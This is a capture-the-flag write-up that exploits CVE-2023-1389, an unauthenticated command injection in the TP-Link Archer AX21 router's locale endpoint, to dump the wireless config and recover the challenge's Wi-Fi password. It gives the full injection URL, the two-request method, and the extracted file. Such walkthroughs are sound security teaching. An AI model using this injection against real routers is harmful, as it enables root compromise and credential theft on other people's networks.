# Dosis Network Down

**Difficulty**: ⭐⭐

---

**Dosis Network Down - Router Exploitation**

*Act 1 Challenge Writeup*

# Challenge Overview

**Difficulty:** ⭐⭐

**Character:** JJ (likes rock, metal, and punk music, accepts BTC,
Skeletor is his hero!)

The gnomes have messed with the neighborhood's WiFi router, changing
the admin password and locking everyone out. Our mission: Hack the
router to recover the WiFi password.

**Question:** *What is the WiFi password found in the router's config?*

# Initial Reconnaissance

## Router Login Page

![Dosis Router Login Page](media/image1.png){width="6.25in"
height="3.5416666666666665in"}

*The router login page displaying critical version information at the
bottom*

## Router Information

From the login page, we gathered:

-   **Model:** Dosis Neighborhood Core Router \| AX1800 Wi-Fi 6 Router

-   **Hardware Version:** Archer AX21 v2.0

-   **Firmware Version:** 1.1.4 Build 20230219 rel.69802

**The login page displays critical version information at the bottom -
this becomes our key to finding the right exploit!**

## Debug Message Clue

After multiple failed login attempts, the browser console displayed:

> Debug: Authentication failed. Have you tried checking the network for
> a debug endpoint?

This hint pointed us toward finding a hidden endpoint or vulnerability.

# Vulnerability Research

## CVE-2023-1389: Command Injection Vulnerability

A Google search for vulnerabilities in "Archer AX21 firmware 1.1.4
Build 20230219" revealed **CVE-2023-1389**, a critical command
injection vulnerability affecting this exact router model and firmware
version.

### Vulnerability Details

-   **CVE ID:** CVE-2023-1389

-   **Type:** OS Command Injection (Unauthenticated RCE)

-   **Affected Endpoint:** /cgi-bin/luci/;stok=/locale

-   **Reference:** Tenable Blog Post on CVE-2023-1389

### How the Exploit Works

The vulnerability allows unauthenticated attackers to execute arbitrary
commands through the country parameter in the locale endpoint. The
router fails to properly sanitize user input, allowing command injection
via \$(command) syntax.

**Exploit Pattern:**

> /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=\$(command)

**Key Requirements:**

1.  Commands must be URL-encoded (spaces become %20)

2.  Two requests are typically needed for successful execution

3.  No authentication required (unauthenticated RCE!)

# Exploitation Steps

## Step 1: Identify Target Config File

WiFi credentials on OpenWrt-based routers (like TP-Link Archer series)
are stored in:

> /etc/config/wireless

## Step 2: Craft Exploit URL

**Command to execute:**

> cat /etc/config/wireless

**URL-encoded version:**

> cat%20/etc/config/wireless

**Full exploit URL:**

> https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=\$(cat%20/etc/config/wireless)

## Step 3: Execute the Exploit

### First Request

Navigate to the exploit URL in your browser:

> https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=\$(cat%20/etc/config/wireless)

**Response:** OK

![OK Response](media/image2.png){width="6.25in"
height="0.4166666666666667in"}

*The simple 'OK' response indicates the router accepted our malicious
payload*

This initializes the command injection. The router processes our input
but doesn't execute it yet - we need a second request.

### Second Request

Refresh the page or make the same request again. On the second attempt,
the router executes the injected command and returns the wireless
configuration file contents directly in the browser!

![Wireless Configuration](media/image3.png){width="6.25in"
height="1.25in"}

*The router dumps the entire /etc/config/wireless file, revealing WiFi
credentials in plaintext!*

**Success!** The router has been successfully exploited, and we can now
extract the WiFi password from the configuration output.

# Extracted Configuration

> config wifi-device 'radio0'
>
> option type 'mac80211'
>
> option channel '6'
>
> option hwmode '11g'
>
> option path 'platform/ahb/18100000.wmac'
>
> option htmode 'HT20'
>
> option country 'US'
>
> config wifi-iface 'default_radio0'
>
> option device 'radio0'
>
> option network 'lan'
>
> option mode 'ap'
>
> **option ssid 'DOSIS-247_2.4G'**
>
> option encryption 'psk2'
>
> **option key 'SprinklesAndPackets2025!'**

# The WiFi Password

**Network Details:**

-   **2.4GHz SSID:** DOSIS-247_2.4G

-   **5GHz SSID:** DOSIS-247_5G

-   **Encryption:** WPA2-PSK (psk2)

-   **WiFi Password: SprinklesAndPackets2025!**

**ANSWER: SprinklesAndPackets2025!**

# Technical Analysis

## Why This Vulnerability Exists

4.  **Insufficient Input Validation:** The router's web interface
    > doesn't sanitize the country parameter. Shell metacharacters like
    > \$() are not filtered.

5.  **Command Execution Context:** The vulnerable endpoint executes
    > system commands with root privileges. User-supplied input is
    > directly interpolated into shell commands.

6.  **No Authentication Required:** The locale endpoint is accessible
    > without authentication, making this a pre-auth RCE vulnerability
    > (Critical severity).

## Security Implications

**This vulnerability allows attackers to:**

-   Execute arbitrary commands as root

-   Read sensitive configuration files (WiFi passwords, admin
    > credentials)

-   Modify router settings

-   Pivot into the internal network

-   Install persistent backdoors

-   Completely compromise the router

**Real-World Impact:**

-   **CVSS Score: 9.8 (Critical)**

-   Affects thousands of consumer routers

-   Often exploited in botnet campaigns

-   Can lead to complete network compromise

# Key Takeaways

7.  **Version Information = Attack Surface:** Router login pages often
    > reveal firmware versions. Always search for CVEs matching exact
    > versions.

8.  **Debug Messages Are Gold:** Error messages and debug output often
    > provide critical hints. Browser DevTools console can reveal hidden
    > information.

9.  **Command Injection Is Powerful:** Allows complete system
    > compromise. Look for any user input that touches system commands.

10. **Router Security Is Often Poor:** Consumer routers frequently have
    > critical vulnerabilities. Firmware updates are essential but
    > rarely applied.

**🎉 Challenge Complete! 🎉**

**Status: ✅ Completed**

**WiFi Password Found: SprinklesAndPackets2025!**

**Vulnerability Exploited: CVE-2023-1389 (Unauthenticated RCE)**

**Method: Command injection via locale endpoint**
